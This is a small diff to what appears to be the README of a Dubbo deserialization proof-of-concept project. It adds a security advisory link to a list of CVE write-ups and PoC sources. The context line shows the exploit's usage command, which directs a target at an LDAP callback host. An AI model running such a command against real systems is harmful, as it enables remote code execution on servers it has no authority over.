@@ -22,3 +22,4 @@ java -jar Dubbo-PoC-Spring-2.7.7.jar ip port ldap://ip:port/test
 - https://checkmarx.com/blog/technical-blog/the-0xdabb-of-doom-cve-2021-25641/
 - [dubbo中使用hessian_http/dubbo协议注入内存马](https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/dubbo%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/)
 - https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202130179.java
+- https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/
